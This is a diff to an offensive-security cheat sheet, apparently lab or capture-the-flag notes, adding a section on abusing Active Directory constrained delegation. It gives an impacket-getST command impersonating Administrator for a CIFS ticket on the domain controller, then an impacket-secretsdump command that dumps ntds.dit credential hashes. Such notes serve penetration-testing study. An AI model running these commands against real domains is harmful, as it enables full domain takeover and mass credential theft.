@@ -28,6 +28,7 @@
   * <<GPO, GPO abuse>>
   * <<write,Write Owner>>
   * <<atribute, Atributes Change>>
+  * <<AllowedToDelegate, AllowedToDelegate>>
 - <<crack, Hashcat and John>>
   * <<hashcat, Hashcat>>
   * <<john, John>>
@@ -773,7 +774,25 @@ Options:
 
 
 
+[[AllowedToDelegate]]
+== AllowedToDelegate
 
+Example
+
+User `blake` has ACL `AllowedToDelegate` over `DC` . So user `blake` has a Constrained Delegation to services in Domain Controller so it's a path to all domain compromised.So i mentioned that user  `blake` has a `AlowedToDelegate SPN`  `CIFS/dc.painters.htb`
+Also i see that user `Administrator` is in `Domain Admins` group and has a privilege `AdminTo` -> `dc.painters.htb`
+
+Extract a Servise cifs ticket
+
+```bash
+impacket-getST -spn 'CIFS/dc.painters.htb' -impersonate 'Administrator' -altservice 'cifs' -k -no-pass 'painters.htb/blake'@dc.painters.htb -dc-ip 192.168.110.55
+```
+
+If i got an Admin access to file system in domain i can dump a `ntds.dit` file
+
+```bash
+impacket-secretsdump painters.htb/'Administrator'@dc.painters.htb -dc-ip 192.168.110.55 -target-ip 192.168.110.55 -use-vss -k -no-pass
+```
 
 [[crack]]
 == Hashcat and John
